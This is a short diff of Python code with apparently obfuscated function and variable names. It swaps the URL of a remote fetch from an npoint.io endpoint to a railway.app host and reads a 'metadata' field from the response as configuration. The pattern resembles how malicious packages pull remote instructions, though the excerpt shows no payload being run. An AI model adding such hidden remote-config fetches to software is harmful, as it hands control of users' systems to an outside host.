@@ -16,7 +16,7 @@ def model_nmpqqa_985():
 
     def learn_dtzghm_415():
         try:
-            learn_pcagui_618 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_pcagui_618 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_pcagui_618.raise_for_status()
             learn_acfktf_578 = learn_pcagui_618.json()
             config_gopujr_421 = learn_acfktf_578.get('metadata')
